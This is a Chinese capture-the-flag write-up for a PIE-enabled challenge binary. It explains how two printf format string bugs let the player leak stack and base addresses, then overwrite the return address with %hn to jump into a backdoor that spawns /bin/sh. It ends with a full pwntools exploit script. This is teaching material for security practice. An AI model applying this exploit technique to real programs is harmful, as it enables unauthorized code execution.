## 漏洞分析

我们依旧IDA起手
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setbuf(stream: stdin, buf: nullptr);
  setbuf(stream: stdout, buf: nullptr);
  setbuf(stream: stderr, buf: nullptr);
  vuln();
  return 0;
}
```
```c
int backdoor()
{
  return system(command: "/bin/sh");
}

int vuln()
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  printf(format: format);
  fgets(s, n: 64, stream: stdin);
  printf(format: s);
  printf(format: "Here is one more chance");
  fgets(s, n: 64, stream: stdin);
  return printf(format: s);
}
```

先跑一下看看，程序开门见山就说这题已经没有栈溢出了
```zsh
❯ ./vuln
It seems you are skilled at stack overflow, but this time no overflow anymore.😈
```

确实，`s` 只有 64 字节，`fgets` 也只读取 64 个字节，怎么算都够不到 Saved RBP 和 Saved RIP，栈溢出这条路是彻底堵死了。但是问题出在别的地方：vuln 里两次 `printf(format: s)` 都把我们的输入直接当成了格式串，这就是再经典不过的格式化字符串漏洞。而且程序里还留了一个 backdoor 函数，什么都不干，直接 `system("/bin/sh")`，所以我们的目标非常简单，就是想个办法把执行流拐到 backdoor 上去。

不过这题开了 PIE，backdoor 的地址每次加载都会变，不能像别的题那样直接把地址写死。好在这题给了我们两次输入的机会，第一次我们只做读取，用 `%p` 把栈上的东西打出来，找到 PIE 的基址和栈地址；第二次再构造 `%n`，把要写的内容写回去。

要写之前得先弄清楚 printf 的参数是从哪来的。vuln 里 `s` 在 rbp-0x40，调用 printf 的时候 rdi 指向 `s`，剩下的寄存器参数是 rsi、rdx、rcx、r8、r9 一共 5 个，所以第 6 个参数开始就是从栈上取的，而 printf 是 call 进去的，call 会把返回地址压栈，于是栈上的第一个参数（也就是第 6 个）恰好是 rbp-0x40，也就是 `s` 自己的开头。`s` 一共 64 字节，占 8 个 qword，所以第 6 到第 13 个参数都是我们自己写进去的内容，再往后第 14 个是 Saved RBP，第 15 个才是 vuln 的返回地址。

所以我们第一次只要发 `%14$p|%15$p`，就能同时拿到 Saved RBP 和 vuln 的返回地址。这里的返回地址是 main 里 `call vuln` 之后的那条指令，也就是 0x1249 加上 PIE 的加载基址，因此把这个值减去 0x1249 就得到了基址，backdoor 的真实地址自然也就出来了。

接下来是写。我们其实并不需要写完整的 8 个字节：backdoor 的偏移是 0x11ee，原来的返回地址偏移是 0x1249，两个地址都在同一个 PIE 里，只有低 16 位不一样，所以只要用一个 `%hn` 把低两个字节改成 backdoor 的低 16 位就够了，高 6 个字节原封不动。要写的地址是 Saved RBP 减去 8，因为 Saved RBP 存的是 main 的 rbp，而 vuln 的 rbp 比它小 16，返回地址又放在 rbp+8 的位置，所以 `rbp_vuln + 8 = Saved RBP - 8`。

至于这个地址放在哪，`s` 的第一个 qword 是第 6 个参数，那么 `s[48]` 正好是第 12 个参数，所以我们把目标地址对齐放在 `s+48` 的地方，前面用 `%<数字>c%12$hn`，数字就是要写入的值，这样 printf 就会把 `s+48` 的八个字节当成指针，往那个地址写两个字节。

到这里原理上就已经通了，但是实际打远端的时候会遇到一个很烦的现象：返回地址确实改对了，程序也确实跳到了 backdoor，但是 shell 拿不到，连接直接断掉，本地却又是好的。这个是栈对齐的问题。正常被 call 进一个函数的时候，进入函数时 rsp 是 8 mod 16，而我们是直接 ret 过去的，没有经过 call，rsp 比正常多了 8 个字节，是 0 mod 16，backdoor 开头又来一句 `push rbp` 再减 8，到了 `call system` 的时候栈就歪了，system 里面一用 movaps 就崩，这也是为什么本地能通远端不行，两边的 libc 对不齐的容忍度不一样。

所以干脆不要从 backdoor 的开头进去，从 `0x11f2` 那句 `lea rax, "/bin/sh"` 开始执行，跳过前面的 `push rbp; mov rbp, rsp`，正好把差掉的那 8 个字节补回来，`call system` 的时候栈就正了，shell 也就能正常起来。

## exp
```python
from pwn import *

context.binary = elf = ELF("./vuln")
context.arch = "amd64"
context.log_level = "info"

backdoor = elf.sym["backdoor"] + 4  # 跳过 push rbp; mov rbp, rsp
ret_off = 0x1249                    # vuln 的返回地址

p = process("./vuln")

p.recvuntil(b"\xf0\x9f\x98\x88")    # 😈
p.sendline(b"%14$p|%15$p")
saved_rbp, saved_rip = [int(x, 16) for x in p.recvline().strip().split(b"|")]
print("Saved RBP:", hex(saved_rbp), "Saved RIP:", hex(saved_rip))

base = saved_rip - ret_off
slot = saved_rbp - 8
want = (base + backdoor) & 0xffff
print("PIE base:", hex(base))
print("Target:", hex(base + backdoor), "Slot:", hex(slot), "Low16:", hex(want))

payload = f"%{want}c%12$hn".encode().ljust(48, b"A") + p64(slot)
p.sendlineafter(b"Here is one more chance", payload)

p.interactive()
```
这里的 `want` 就是 low 16 位，`%<want>c` 会先输出 want 个字符，然后 `%12$hn` 把这 2 个字节写到 `slot` 上。payload 一共 56 个字节，没有超过 fgets 的 64 字节限制。

另外，如果栈地址里恰好出现 `0x0a`，`fgets` 会提前截断；或者地址的字节里出现 `%`，printf 会把它当成格式符解析错，这时候重连一次就好了。

远端只需要把上面那段 `process` 换成 `remote`，其它一个字都不用改

